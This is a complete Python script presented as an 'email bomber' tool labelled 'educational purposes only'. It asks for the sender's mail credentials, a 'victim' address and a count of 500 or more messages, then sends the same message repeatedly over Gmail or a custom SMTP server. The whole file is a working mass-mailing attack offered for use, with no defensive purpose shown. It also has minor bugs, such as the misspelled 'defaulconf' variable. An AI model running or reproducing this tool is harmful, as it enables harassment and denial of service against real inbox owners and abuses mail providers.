from os import urandom
import smtplib
from getpass import getpass
import sys
from time import sleep

print('                                                     ')
print('                EMAIL BOMBER TOOL V1                 ')
print('                        BY:                          ')
print('                 A R I E L  Y A P                    ')
print('                                                     ')
print('             EDUCATIONAL PURPOSES ONLY               ')
print('\n\n')

user = input('YOUR ANONYMOUS NAME : ')
email = input('\nYOUR EMAIL ADDRESS : ')
passwd = getpass('\nYOUR EMAIL PASSWORD : ')
to = input('\nVICTIM EMAIL ADDRESS :')
total = input('\nNUMBER OF EMAILS SENT(500 minimum) : ')
body = input('\nYOUR MESSAGE : ')
Cserver = input('\nCustom smtp server (leave blank to use gmail): ')

if not Cserver == '':
    defaulconf = False
    smtp_server = Cserver
    Cport = input('Custom smtp port (leave blank to use defaul port): ')
    if not Cport == '':
        port = int(Cport)
    else:
        port = 587
else:
    smtp_server = 'smtp.gmail.com'
    port = 587
    defaultconf = True

try:
    server = smtplib.SMTP(smtp_server, port)
    server.ehlo()
    server.starttls()
    server.login(email, passwd)
    for i in range(1, int(total) + 1):
        subject = urandom(9)
        msg = 'From: ' + user + '\nMessage: ' + '\n' + body
        server.sendmail(email, to, msg)
        print("\rE-mails sent: %i" % i)
        sleep(1)
        sys.stdout.flush()
    server.quit()
    print('\n Done !!!')
    sys.exit()
except KeyboardInterrupt:
    print('[-] Canceled')
    sys.exit()
except smtplib.SMTPAuthenticationError:
    if defaulconf:
        print('[!] The username or password you entered is incorrect')
        print('[!] OR')
        print('[!] You forget to enable less secure access on your google account')
    else:
        print('\n[!] The username, password or custom STMP server/port you entered is incorrect.')
    sys.exit()
